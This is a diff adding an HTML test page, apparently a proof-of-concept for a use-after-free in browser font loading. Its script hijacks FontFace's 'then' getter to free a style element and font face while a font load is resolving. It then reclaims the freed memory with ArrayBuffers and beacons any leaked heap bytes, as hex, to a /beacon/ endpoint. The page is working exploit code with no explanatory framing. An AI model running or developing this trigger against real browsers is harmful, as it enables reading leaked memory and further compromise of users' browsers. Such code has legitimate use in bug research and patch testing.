@@ -1,0 +1,59 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf3</title>
+<script>
+/* One trial per page load. ?s=<bytes>&k=<count>&c=1 (c=1 keeps the style, no free).
+   No beacon fires inside the getter: every beacon is an allocation and the
+   earlier pages showed that beacons alone change the window. The only output is
+   the verdict, so the reclaim allocation is the first thing after the free. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var Q = {}; location.search.replace(/[?&]([^=&]+)=([^&]*)/g, function(_, k, v){ Q[k] = v; });
+var SIZE = 128, K = 4, CTRL = false;
+var styleEl = null, fired = false, BUF = [], VIEW = [], reported = false;
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function report(why, extra){
+  if (reported) return; reported = true;
+  var hits = 0, first = null, total = 0;
+  for (var i = 0; i < VIEW.length; i++) {
+    var v = VIEW[i], n = 0;
+    for (var j = 0; j < v.length; j++) { if (v[j] !== 0) { n++; if (!first) first = { b: i, o: j }; } }
+    if (n) { hits++; total += n; }
+  }
+  if (!total) { b('U3-S' + SIZE + '-K' + K + (CTRL ? '-C' : '') + '-' + why + '-CLEAN'); return; }
+  var s = '';
+  for (var j = first.o; j < first.o + 32 && j < SIZE; j++) s += hex(VIEW[first.b][j]);
+  b('U3-S' + SIZE + '-K' + K + (CTRL ? '-C' : '') + '-' + why + '-HIT-b' + first.b + '-o' + first.o + '-' + s + (extra ? extra : ''));
+}
+function setup(){
+  var A = new FontFace('v', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: w; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (!CTRL && styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < K; i++) { var ab = new ArrayBuffer(SIZE); BUF.push(ab); VIEW.push(new Uint8Array(ab)); }
+      try { document.fonts.check('1em w'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+  var pr;
+  try { pr = document.fonts.load('1em v, w', 'AB'); } catch (e) { b('U3-S' + SIZE + '-THROW'); return; }
+  pr.then(function(){ report('S'); }, function(){ report('R'); });
+  setTimeout(function(){ if (fired) report('T'); }, 300);
+  setTimeout(function(){ if (!fired) b('U3-S' + SIZE + '-NOGETTER'); }, 1500);
+}
+function run(){
+  b('U3-S' + SIZE + '-K' + K + (CTRL ? '-C' : '') + '-START');
+  setup();
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>uaf3</p></body></html>
